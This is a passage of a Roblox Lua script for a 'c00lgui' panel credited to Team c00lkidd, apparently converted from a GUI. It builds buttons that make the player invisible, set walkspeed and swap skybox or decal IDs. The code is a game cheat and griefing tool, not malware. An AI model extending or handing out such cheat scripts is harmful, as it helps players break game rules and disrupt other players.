PageLabel_9.Font = Enum.Font.SourceSans
PageLabel_9.Text = "Mercy"
PageLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
PageLabel_9.TextSize = 18.000
PageLabel_9.TextWrapped = true

PageLabel_10.Name = "PageLabel"
PageLabel_10.Parent = Page5
PageLabel_10.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageLabel_10.BorderColor3 = Color3.fromRGB(255, 0, 0)
PageLabel_10.BorderSizePixel = 0
PageLabel_10.Position = UDim2.new(0, 0, 0.250696391, -30)
PageLabel_10.Size = UDim2.new(1, 0, -0.00835654046, 30)
PageLabel_10.ZIndex = 2
PageLabel_10.Font = Enum.Font.SourceSans
PageLabel_10.Text = "14anz"
PageLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
PageLabel_10.TextSize = 18.000
PageLabel_10.TextWrapped = true

PageLabel_11.Name = "PageLabel"
PageLabel_11.Parent = Page5
PageLabel_11.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
PageLabel_11.BorderColor3 = Color3.fromRGB(255, 0, 0)
PageLabel_11.BorderSizePixel = 0
PageLabel_11.Position = UDim2.new(0, 0, 0.317548752, -30)
PageLabel_11.Size = UDim2.new(1, 0, -0.00835654046, 30)
PageLabel_11.ZIndex = 2
PageLabel_11.Font = Enum.Font.SourceSans
PageLabel_11.Text = "007n7/c00lkidd"
PageLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
PageLabel_11.TextSize = 18.000
PageLabel_11.TextWrapped = true

CloseOpen.Name = "Close/Open"
CloseOpen.Parent = si
CloseOpen.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
CloseOpen.BorderColor3 = Color3.fromRGB(255, 0, 0)
CloseOpen.BorderSizePixel = 3
CloseOpen.Position = UDim2.new(-0.00100000005, 3, 0.677999973, 0)
CloseOpen.Size = UDim2.new(0, 300, 0, 20)
CloseOpen.ZIndex = 3
CloseOpen.Font = Enum.Font.SourceSans
CloseOpen.Text = "Close"
CloseOpen.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseOpen.TextSize = 18.000

-- Module Scripts:

local fake_module_scripts = {}

do -- nil.FakeMouse
	local script = Instance.new('ModuleScript', nil)
	script.Name = "FakeMouse"
	local function module_script()
		local Converter = {}
		script.Client.Disabled = false -- enables the client
		
		
		Converter.LocalPlayer = nil
		local Plr = nil -- temp
		
		
		script.GetPlr.OnServerEvent:Connect(function(Plrr)
			Plr = Plrr
		end)
		
		
		
		-- A LIST OF ALL FUNCTIONS / EVENTS / PROPERTIES --
		
		repeat wait() until Plr
		
		function Converter:GetPlr()
			return script.GetPlrE:InvokeClient(Plr)
		end
		
		
		Converter.LocalPlayer = Plr
		
		return Converter
	end
	fake_module_scripts[script] = module_script
end


-- Scripts:

local function UHBG_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
	if script.Parent.Parent.Page1.Visible == true then
	script.Parent.Parent.Page1.Visible = false
	script.Parent.Parent.Page5.Visible = true
	elseif script.Parent.Parent.Page2.Visible == true then
	script.Parent.Parent.Page2.Visible = false
	script.Parent.Parent.Page1.Visible = true
	elseif script.Parent.Parent.Page3.Visible == true then
	script.Parent.Parent.Page3.Visible = false
	script.Parent.Parent.Page2.Visible = true
	elseif script.Parent.Parent.Page4.Visible == true then
	script.Parent.Parent.Page4.Visible = false
	script.Parent.Parent.Page3.Visible = true
	elseif script.Parent.Parent.Page5.Visible == true then
	script.Parent.Parent.Page5.Visible = false
	script.Parent.Parent.Page4.Visible = true
	end	
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(UHBG_fake_script)()
local function KUKFVZE_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
	if script.Parent.Parent.Page1.Visible == true then
	script.Parent.Parent.Page1.Visible = false
	script.Parent.Parent.Page2.Visible = true
	elseif script.Parent.Parent.Page2.Visible == true then
	script.Parent.Parent.Page2.Visible = false
	script.Parent.Parent.Page3.Visible = true
	elseif script.Parent.Parent.Page3.Visible == true then
	script.Parent.Parent.Page3.Visible = false
	script.Parent.Parent.Page4.Visible = true
	elseif script.Parent.Parent.Page4.Visible == true then
	script.Parent.Parent.Page4.Visible = false
	script.Parent.Parent.Page5.Visible = true
	elseif script.Parent.Parent.Page5.Visible == true then
	script.Parent.Parent.Page5.Visible = false
	script.Parent.Parent.Page1.Visible = true
	end	
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(KUKFVZE_fake_script)()
local function ZTZMDHS_fake_script() -- SettingsButton.LocalScript 
	local script = Instance.new('LocalScript', SettingsButton)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	cango = true
	function click()
	if cango == true then
	if script.Parent.Text == "<" then
	script.Parent.Text = ">"
	cango = false
	repeat
	wait()
	script.Parent.Parent.Position = UDim2.new(1,script.Parent.Parent.Position.X.Offset-10,0,0)
	until script.Parent.Parent.Position.X.Offset <= -293
	wait()
	script.Parent.Parent.Position = UDim2.new(1,-300,0,0)
	cango = true
	else
	script.Parent.Text = "<"
	cango = false
	repeat
	wait()
	script.Parent.Parent.Position = UDim2.new(1,script.Parent.Parent.Position.X.Offset+10,0,0)
	until script.Parent.Parent.Position.X.Offset >= -10
	wait()
	script.Parent.Parent.Position = UDim2.new(1,3,0,0)
	cango = true
	end	
	end
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(ZTZMDHS_fake_script)()
local function XZIUGMA_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
	if script.Parent.Parent.Page1.Visible == true then
	script.Parent.Parent.Page1.Visible = false
	script.Parent.Parent.Page2.Visible = true
	elseif script.Parent.Parent.Page2.Visible == true then
	script.Parent.Parent.Page2.Visible = false
	script.Parent.Parent.Page1.Visible = true
	end	
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(XZIUGMA_fake_script)()
local function QZJX_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
	if script.Parent.Parent.Page1.Visible == true then
	script.Parent.Parent.Page1.Visible = false
	script.Parent.Parent.Page2.Visible = true
	elseif script.Parent.Parent.Page2.Visible == true then
	script.Parent.Parent.Page2.Visible = false
	script.Parent.Parent.Page1.Visible = true
	end	
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(QZJX_fake_script)()
local function DFNUHMF_fake_script() -- TextButton_6.Script 
	local script = Instance.new('Script', TextButton_6)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
		local LocalPlayer = require(script.FakeMouse):GetPlr()
		if script.Parent.Text == "Off" then
			LocalPlayer.Character.Head.Transparency = 1
			LocalPlayer.Character.Head.face.Transparency = 1
			LocalPlayer.Character.Torso.Transparency = 1
			LocalPlayer.Character["Right Arm"].Transparency = 1
			LocalPlayer.Character["Left Arm"].Transparency = 1
			LocalPlayer.Character["Right Leg"].Transparency = 1
			LocalPlayer.Character["Left Leg"].Transparency = 1
			script.Parent.Text = "On"
		else
			LocalPlayer.Character.Head.Transparency = 0
			LocalPlayer.Character.Head.face.Transparency = 0
			LocalPlayer.Character.Torso.Transparency = 0
			LocalPlayer.Character["Right Arm"].Transparency = 0
			LocalPlayer.Character["Left Arm"].Transparency = 0
			LocalPlayer.Character["Right Leg"].Transparency = 0
			LocalPlayer.Character["Left Leg"].Transparency = 0
			script.Parent.Text = "Off"
		end
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(DFNUHMF_fake_script)()
-- nil.Client is disabled.
local function KTHTB_fake_script() -- Save.LocalScript 
	local script = Instance.new('LocalScript', Save)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
	game.Workspace.Owner["Skybox/DecalID"].Value = script.Parent.Parent.Page1["Skybox/Decal ID"].Value.Value
	game.Workspace.Owner["PlaceID"].Value = script.Parent.Parent.Page1["Place ID"].Value.Value
	game.Workspace.Owner["MusicID"].Value = script.Parent.Parent.Page1["Music ID"].Value.Value
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(KTHTB_fake_script)()
local function HGPX_fake_script() -- Load.LocalScript 
	local script = Instance.new('LocalScript', Load)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
	script.Parent.Parent.Page1["Skybox/Decal ID"].TextBox.Text = game.Workspace.Owner["Skybox/DecalID"].Value
	script.Parent.Parent.Page1["Place ID"].TextBox.Text = game.Workspace.Owner["PlaceID"].Value
	script.Parent.Parent.Page1["Music ID"].TextBox.Text = game.Workspace.Owner["MusicID"].Value
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(HGPX_fake_script)()
local function JEKU_fake_script() -- Cat.Script 
	local script = Instance.new('Script', Cat)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
		script.Parent.Parent.Parent.Parent.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 8408806737
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(JEKU_fake_script)()
local function SXZQ_fake_script() -- RC7.Script 
	local script = Instance.new('Script', RC7)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
		script.Parent.Parent.Parent.Parent.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 331959655
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(SXZQ_fake_script)()
local function YFMHCO_fake_script() -- teamskrubl0rd.Script 
	local script = Instance.new('Script', teamskrubl0rd)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
		script.Parent.Parent.Parent.Parent.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 358313209
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(YFMHCO_fake_script)()
local function VAYESQX_fake_script() -- SetWalkspeed.LocalScript 
	local script = Instance.new('LocalScript', SetWalkspeed)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = script.Parent.Parent.Parent.Parent.Settings.Page2["Walkspeed Amount"].Value.Value
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(VAYESQX_fake_script)()
local function QOJKJZL_fake_script() -- CloseOpen.LocalScript 
	local script = Instance.new('LocalScript', CloseOpen)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	function click()
	if script.Parent.Text == "Close" then
	script.Parent.Parent.Frame.Visible = false
	script.Parent.Text = "Open" else
	script.Parent.Parent.Frame.Visible = true
	script.Parent.Text = "Close"	
	end	
	end
	
	script.Parent.MouseButton1Down:connect(click)
end
coroutine.wrap(QOJKJZL_fake_script)()
local function DWQI_fake_script() -- si.owner 
	local script = Instance.new('Script', si)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	
	if game.Workspace:FindFirstChild("Owner") then
	else
		v = Instance.new("StringValue",workspace)
			v.Name = "Owner"
		v.Value = script.Parent.Parent.Parent.Name
		skyboxid = Instance.new("IntValue",v)
		skyboxid.Value = 157772998
		skyboxid.Name = "Skybox/DecalID"
		placeid = Instance.new("IntValue",v)
		placeid.Value = 149559312
		placeid.Name = "PlaceID"
		musicid = Instance.new("IntValue",v)
		musicid.Value = 142930454
		musicid.Name = "MusicID"
		gearid = Instance.new("IntValue",v)
		gearid.Value = 108149175
		gearid.Name = "GearID"
	
	end
	
end
coroutine.wrap(DWQI_fake_script)()
local function NJAVBH_fake_script() -- si.LocalScript 
	local script = Instance.new('LocalScript', si)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local version = script.Parent.Version.Value
	s = Instance.new("Message",game.Players.LocalPlayer.PlayerGui)
	s.Text = "c00lgui By Team c00lkidd has loaded."
	wait(3)
	s:Remove()
end
coroutine.wrap(NJAVBH_fake_script)()
-- si.UpdateProps is disabled.
